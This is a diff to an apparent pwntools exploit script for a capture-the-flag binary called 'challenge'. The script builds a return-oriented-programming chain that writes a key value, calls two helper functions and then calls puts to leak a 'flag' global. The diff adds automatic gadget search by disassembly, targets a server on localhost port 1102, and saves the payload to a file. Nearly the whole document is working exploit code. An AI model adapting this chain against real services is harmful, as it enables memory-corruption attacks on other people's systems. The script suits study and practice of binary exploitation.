@@ -9,26 +9,36 @@ def get_gadget(elf: ELF, instructions: Union[list, tuple]) -> bytes:
     return p64(gadget.address)
 
 
+def search_instructions(elf: ELF, func_name: str, instruction: str, bytes_range=100):
+    all_calls = elf.disasm(elf.symbols[func_name], bytes_range).split('\n')
+    all_calls_addr = []
+
+    for ins in all_calls:
+        if instruction in ins:
+            addr_str = ins.split(':')[0].strip()
+            all_calls_addr.append(p64(int(addr_str, 16)))
+    return all_calls_addr
+
 elf = ELF("./challenge", checksec=False)
 
 # TODO fin a way to call [] and `call` instructions
 gadget_popr14       = get_gadget(elf, ['pop r14', 'ret'])
 gadget_popr15       = get_gadget(elf, ['pop r15', 'ret'])
-gadget_loadr15inr14 = p64(0x000000000040076a)
-gadget_poprdi       = p64(0x0000000000400771)
+gadget_loadr15inr14 = search_instructions(elf, 'gogo', 'mov    QWORD PTR [r14], r15')[0]
+gadget_poprdi       = search_instructions(elf, 'gogo', 'pop    rdi')[0]
 vulnerablefunc      = p64(elf.symbols.get("read_inp"))
 firstpart           = p64(elf.symbols.get("first_part"))
 secondpart          = p64(elf.symbols.get("second_part"))
 flag_global         = p64(elf.symbols.get("flag"))
 key_global          = p64(elf.symbols.get("key"))
-call_puts           = p64(0x00000000004008c1)
+call_puts           = search_instructions(elf, 'read_inp', 'call   0x400')[0]
 key_char            = p64(ord('%'))
 
-pad = cyclic(8)
-buf = cyclic(40)
+pad = b'p' * 8
+buf = b'a' * 40
 f = vulnerablefunc
 
-p = process("./challenge")
+p = remote("localhost", 1102) #process("./challenge") # 
 
 # write % to key
 gogo = b''
@@ -43,7 +53,19 @@ gogo += buf + secondpart + f + pad
 # print global
 gogo += buf + gadget_poprdi + flag_global + call_puts
 
+if gogo.count(b'\n'):
+    log.warn("payload contains a newline, but it should not. Payload may fail")
+    n = len(gogo.split(b'\n')[0])
+    log.warn(f"payload is {len(gogo)} long. newline found at offset {n}")
+    log.warn(f"this means newline is in the part {int(n/64+1)} of the payload (index {n/64})")
+    log.warn(f"payload around newline: {gogo[n-10:n+10]}")
+
 p.sendline(gogo)
 
-p.recvuntil("PoC")
-log.success("PoC" + p.recvline().decode())
+
+with open("/tmp/rop", "wb") as f:
+    f.write(gogo)
+
+print(p.recvall())
+# p.recvuntil("PoC")
+# log.success("PoC" + p.recvline().decode())
